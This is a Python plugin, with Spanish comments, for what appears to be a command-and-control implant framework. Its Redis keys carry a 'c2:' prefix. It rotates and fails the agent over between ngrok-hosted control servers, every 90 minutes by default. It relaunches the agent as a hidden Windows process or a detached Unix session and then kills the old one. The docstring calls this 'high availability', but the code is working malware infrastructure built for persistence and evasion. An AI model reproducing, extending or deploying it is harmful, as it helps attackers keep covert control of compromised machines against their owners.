# agent/plugins/rotate_server.py
"""
Plugin de Alta Disponibilidad con Failover Inteligente.

ESTADOS DEL SISTEMA:
  NORMAL:     Agente conectado al servidor activo (A por defecto)
  FAILOVER:   Servidor activo cayó → agente se conecta al siguiente
  RECOVERING: Servidor caído intenta volver a Redis
  ROTATING:   Rotación programada cada 90 minutos

FLUJO:
  1. Agente conectado a A
  2. A se cae → Agente conecta a B (B toma rol de A)
  3a. B no cae → 90 min → rota a C → vuelve al inicio
  3b. B cae → C toma rol → A (recuperado) intenta volver
       Cuando A vuelve → 90 min → rota
"""

import os
import sys
import json
import time
import subprocess
import platform
import threading
import importlib
from plugins import BasePlugin

# ============================================================
# CLAVES REDIS
# ============================================================
KEY_ACTIVE_SERVER   = "c2:active_server"      # Servidor actualmente activo
KEY_SERVER_PRIORITY = "c2:server_priority"    # Lista ordenada de prioridad
KEY_ROTATION_TIME   = "c2:next_rotation"      # Timestamp próxima rotación
KEY_ROTATION_ACTIVE = "config:auto_rotation"  # "1" o "0"
KEY_ROTATION_MINS   = "config:rotation_interval"  # Minutos entre rotaciones
KEY_AGENT_STATUS    = "c2:agent_status"       # Estado del agente
KEY_LAST_ROTATION   = "agent:last_rotation"   # Info última rotación
KEY_FAILOVER_LOG    = "c2:failover_log"       # Historial de failovers


def get_redis_client():
    """Obtiene cliente Redis con la configuración del entorno."""
    try:
        import redis as redis_lib
        r = redis_lib.Redis(
            host=os.getenv("REDIS_HOST", "192.168.1.55"),
            port=int(os.getenv("REDIS_PORT", 6379)),
            decode_responses=True,
            socket_connect_timeout=5
        )
        r.ping()
        return r
    except Exception as e:
        return None


def get_available_servers(r):
    """Obtiene todos los servidores disponibles en Redis ordenados por nombre."""
    try:
        keys = r.keys("server:*:ngrok_url")
        servers = []
        for key in keys:
            name = key.split(":")[1]
            url = r.get(key)
            if url and "0.0.0.0" not in url:
                servers.append({"name": name, "url": url.rstrip('/')})
        servers.sort(key=lambda x: x['name'])
        return servers
    except Exception:
        return []


def get_next_server(r, current_name, servers):
    """Selecciona el siguiente servidor disponible."""
    if not servers:
        return None

    # Obtener prioridad guardada en Redis
    priority_json = r.get(KEY_SERVER_PRIORITY)
    if priority_json:
        try:
            priority = json.loads(priority_json)
            # Ordenar servers según prioridad guardada
            priority_map = {name: i for i, name in enumerate(priority)}
            servers_sorted = sorted(servers, key=lambda x: priority_map.get(x['name'], 99))
        except Exception:
            servers_sorted = servers
    else:
        servers_sorted = servers

    if len(servers_sorted) == 1:
        return servers_sorted[0]  # Solo uno disponible

    # Encontrar siguiente al actual
    current_idx = -1
    for i, s in enumerate(servers_sorted):
        if s['name'] == current_name:
            current_idx = i
            break

    next_idx = (current_idx + 1) % len(servers_sorted)
    return servers_sorted[next_idx]


def launch_new_agent(target_url, redis_host, redis_port, target_server_name):
    """Lanza un nuevo proceso agente conectado a la URL destino."""
    agent_script = os.path.abspath(
        os.path.join(os.path.dirname(__file__), '..', 'agent_ngrok.py')
    )

    if not os.path.exists(agent_script):
        return False, f"agent_ngrok.py no encontrado en: {agent_script}"

    env = os.environ.copy()
    env["REDIS_HOST"] = redis_host
    env["REDIS_PORT"] = str(redis_port)
    env["CURRENT_SERVER"] = target_server_name

    try:
        if platform.system() == "Windows":
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
            subprocess.Popen(
                [sys.executable, agent_script, target_url],
                startupinfo=startupinfo,
                env=env,
                creationflags=subprocess.CREATE_NEW_PROCESS_GROUP
            )
        else:
            subprocess.Popen(
                [sys.executable, agent_script, target_url],
                env=env,
                start_new_session=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        return True, "OK"
    except Exception as e:
        return False, str(e)


def log_event(r, event_type, data):
    """Registra un evento en Redis."""
    try:
        entry = json.dumps({
            "type": event_type,
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S"),
            **data
        })
        # Guardar en lista (máximo 20 entradas)
        r.lpush(KEY_FAILOVER_LOG, entry)
        r.ltrim(KEY_FAILOVER_LOG, 0, 19)
    except Exception:
        pass


class Plugin(BasePlugin):
    name = "rotate_server"
    description = "Alta disponibilidad: failover inteligente y rotación automática cada 90 min"

    def run(self, args=None):
        """
        Modos de ejecución:
          rotate_server            → Rota al siguiente servidor
          rotate_server <nombre>   → Rota a servidor específico
          rotate_server status     → Ver estado del sistema
          rotate_server setup      → Inicializar prioridades en Redis
          rotate_server auto_on    → Activar rotación automática
          rotate_server auto_off   → Desactivar rotación automática
          rotate_server failover   → Simular failover manual
        """
        r = get_redis_client()
        if not r:
            return "[-] No se pudo conectar a Redis"

        redis_host = os.getenv("REDIS_HOST", "192.168.1.55")
        redis_port = os.getenv("REDIS_PORT", "6379")
        current_server = os.getenv("CURRENT_SERVER", r.get(KEY_ACTIVE_SERVER) or "")

        cmd = (args or "").strip().lower()

        # ==========================================
        # STATUS: Ver estado del sistema
        # ==========================================
        if cmd == "status":
            return self._get_status(r)

        # ==========================================
        # SETUP: Inicializar prioridades
        # ==========================================
        if cmd == "setup":
            return self._setup_priorities(r)

        # ==========================================
        # AUTO_ON / AUTO_OFF
        # ==========================================
        if cmd == "auto_on":
            interval = int(r.get(KEY_ROTATION_MINS) or 90)
            r.set(KEY_ROTATION_ACTIVE, "1")
            next_rotation = time.time() + (interval * 60)
            r.set(KEY_ROTATION_TIME, str(next_rotation))
            return f"[+] Rotación automática activada: cada {interval} min\n[*] Próxima rotación: {time.strftime('%H:%M:%S', time.localtime(next_rotation))}"

        if cmd == "auto_off":
            r.set(KEY_ROTATION_ACTIVE, "0")
            return "[+] Rotación automática desactivada"

        # ==========================================
        # FAILOVER: Conectar al siguiente servidor
        # ==========================================
        if cmd == "failover":
            return self._do_failover(r, current_server, redis_host, redis_port, reason="manual")

        # ==========================================
        # ROTATE: Rotación normal (manual o programada)
        # ==========================================
        servers = get_available_servers(r)
        if not servers:
            return "[-] No hay servidores disponibles en Redis"

        # Determinar servidor destino
        if args and args.strip() and args.strip().lower() not in ["rotate", ""]:
            # Servidor específico
            target = next((s for s in servers if s['name'] == args.strip()), None)
            if not target:
                available = [s['name'] for s in servers]
                return f"[-] Servidor '{args.strip()}' no encontrado.\n[*] Disponibles: {available}"
        else:
            # Siguiente en la rotación
            target = get_next_server(r, current_server, servers)
            if not target:
                return "[-] No hay servidor destino disponible"

        if target['name'] == current_server:
            return f"[*] Ya estás conectado a {current_server}. Reconectando...\n" + \
                   self._rotate_to(r, target, current_server, redis_host, redis_port, "reconnect")

        return self._rotate_to(r, target, current_server, redis_host, redis_port, "rotation")

    def _rotate_to(self, r, target, current_server, redis_host, redis_port, reason):
        """Ejecuta la rotación hacia el servidor destino."""
        output = f"[*] Iniciando rotación ({reason})\n"
        output += f"[*] Actual:  {current_server or 'desconocido'}\n"
        output += f"[*] Destino: {target['name']} → {target['url']}\n\n"

        # Lanzar nuevo agente
        success, msg = launch_new_agent(
            target['url'], redis_host, redis_port, target['name']
        )

        if not success:
            return output + f"[-] Error lanzando nuevo agente: {msg}"

        output += f"[+] Nuevo agente lanzado → {target['name']}\n"

        # Actualizar Redis
        r.set(KEY_ACTIVE_SERVER, target['name'])
        log_event(r, reason, {
            "from": current_server,
            "to": target['name'],
            "url": target['url']
        })
        r.setex(KEY_LAST_ROTATION, 600, json.dumps({
            "from": current_server,
            "to": target['name'],
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S")
        }))

        # Actualizar próxima rotación si está activa
        if r.get(KEY_ROTATION_ACTIVE) == "1":
            interval = int(r.get(KEY_ROTATION_MINS) or 90)
            next_rotation = time.time() + (interval * 60)
            r.set(KEY_ROTATION_TIME, str(next_rotation))
            output += f"[*] Próxima rotación: {time.strftime('%H:%M:%S', time.localtime(next_rotation))}\n"

        output += f"[*] Cerrando proceso actual en 5s...\n"
        time.sleep(5)
        os._exit(0)
        return output

    def _do_failover(self, r, current_server, redis_host, redis_port, reason="failover"):
        """Ejecuta failover al siguiente servidor disponible."""
        servers = get_available_servers(r)

        # Excluir servidor actual (está caído)
        other_servers = [s for s in servers if s['name'] != current_server]

        if not other_servers:
            return f"[-] Failover fallido: no hay otros servidores disponibles\n[*] Reintentando en 30s..."

        target = other_servers[0]
        output = f"[!] FAILOVER DETECTADO\n"
        output += f"[!] Servidor caído: {current_server}\n"
        output += f"[→] Conectando a: {target['name']}\n"

        # Registrar failover
        log_event(r, "failover", {
            "failed_server": current_server,
            "new_server": target['name']
        })

        return self._rotate_to(r, target, current_server, redis_host, redis_port, reason)

    def _setup_priorities(self, r):
        """Inicializa la lista de prioridad de servidores en Redis."""
        servers = get_available_servers(r)
        if not servers:
            return "[-] No hay servidores en Redis para configurar"

        priority = [s['name'] for s in servers]
        r.set(KEY_SERVER_PRIORITY, json.dumps(priority))
        r.set(KEY_ACTIVE_SERVER, priority[0])
        r.set(KEY_ROTATION_MINS, "90")

        output = "[+] Prioridades configuradas:\n"
        for i, name in enumerate(priority):
            output += f"    {i+1}. {name}\n"
        output += f"\n[*] Servidor activo: {priority[0]}"
        output += f"\n[*] Intervalo rotación: 90 min"
        output += f"\n[*] Usa 'rotate_server auto_on' para activar rotación automática"
        return output

    def _get_status(self, r):
        """Retorna el estado actual del sistema de HA."""
        servers = get_available_servers(r)
        active = r.get(KEY_ACTIVE_SERVER) or "no configurado"
        auto = r.get(KEY_ROTATION_ACTIVE) or "0"
        interval = r.get(KEY_ROTATION_MINS) or "90"
        next_rot = r.get(KEY_ROTATION_TIME)
        priority_json = r.get(KEY_SERVER_PRIORITY)

        output = "=========================================\n"
        output += "     ESTADO DEL SISTEMA DE HA            \n"
        output += "=========================================\n"
        output += f"Servidor activo:    {active}\n"
        output += f"Rotación auto:      {'✅ ON' if auto == '1' else '❌ OFF'}\n"
        output += f"Intervalo:          {interval} min\n"

        if next_rot:
            try:
                next_ts = float(next_rot)
                remaining = max(0, next_ts - time.time())
                mins = int(remaining // 60)
                secs = int(remaining % 60)
                output += f"Próxima rotación:   en {mins}m {secs}s\n"
            except Exception:
                pass

        output += "\nServidores disponibles:\n"
        for s in servers:
            marker = "→ ACTIVO" if s['name'] == active else "  standby"
            output += f"  [{marker}] {s['name']}: {s['url']}\n"

        if priority_json:
            try:
                priority = json.loads(priority_json)
                output += f"\nOrden de prioridad: {' > '.join(priority)}\n"
            except Exception:
                pass

        # Últimos failovers
        log_entries = r.lrange(KEY_FAILOVER_LOG, 0, 4)
        if log_entries:
            output += "\nÚltimos eventos:\n"
            for entry in log_entries:
                try:
                    e = json.loads(entry)
                    output += f"  [{e.get('timestamp','')}] {e.get('type','')}: {e.get('from','?')} → {e.get('to', e.get('new_server','?'))}\n"
                except Exception:
                    pass

        return output
